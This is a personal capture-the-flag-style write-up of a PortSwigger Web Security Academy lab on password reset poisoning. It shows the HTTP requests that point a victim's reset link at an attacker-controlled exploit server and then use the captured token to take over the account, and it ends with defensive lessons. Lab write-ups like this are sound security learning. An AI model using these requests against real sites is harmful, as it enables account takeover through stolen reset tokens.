# Host Header Lab 1 — Basic password reset poisoning — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** HTTP Host Header Attacks
**Lab:** Basic password reset poisoning
**Difficulty:** Apprentice
**Solved:** 27 November 2026 ~05:00 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Password reset poisoning — the application builds the password-reset URL in the email from the HTTP `Host` header, so an attacker can make the victim's reset link point at a server the attacker controls and steal the reset token.

## Solution

1. Logged in as `wiener:peter` and requested a password reset for my own account (`POST /forgot-password`, `username=wiener`). The reset email appears in the email client on the lab's exploit server and contains a link with a `temp-forgot-password-token` parameter.
2. Sent the same request for `carlos`, but with the `Host` header changed to the exploit server:
   ```
   POST /forgot-password
   Host: exploit-0a5200c404e52507806802d201df00c9.exploit-server.net
   Content-Type: application/x-www-form-urlencoded

   csrf=<token>&username=carlos
   ```
   Carlos "carelessly clicks" the link in his email, so his reset token landed in the exploit server's access log as `GET /forgot-password?temp-forgot-password-token=<carlos-token>`.
3. Opened the genuine reset URL with Carlos's token and submitted the new-password form — the token must be sent as the `temp-forgot-password-token` form field as well as in the URL (submitting it only in the URL returns "Invalid token"):
   ```
   POST /forgot-password
   csrf=<token>&temp-forgot-password-token=<carlos-token>&new-password-1=CarlosReset123!&new-password-2=CarlosReset123!
   ```
4. Logged in as `carlos` with the new password — home page showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the app takes the domain for the reset link from the `Host` header instead of a fixed configuration value. Whoever controls the request controls where the victim's token is sent.
- **Why the exploit server:** the victim's email client is simulated on the lab's exploit server, and the poisoned link points there — the token arrives in the exploit server's access log, where the attacker can read it.
- **Two gotchas found while solving:** (a) the Academy edge routes by the `_lab` cookie when the `Host` header names an unknown host, so the poisoned request must carry the session cookies exactly as set (a raw `Cookie` header works; the `requests` session's cookie jar mangles the `_lab` value and the request is routed to the exploit server instead, HTTP 404); (b) the reset form needs the token as a form field, not just in the query string, and the access log accumulates old tokens — always use the *last* token in the log, because each new reset invalidates the previous one.

## Lessons Learned

- Never build absolute URLs (especially security-sensitive ones like password resets) from the `Host` header — use a fixed, configured domain.
- Validate the `Host` header against a whitelist; reject or ignore unrecognized hosts.
- Reset tokens must be single-use and short-lived, and the reset form should not accept an empty token.
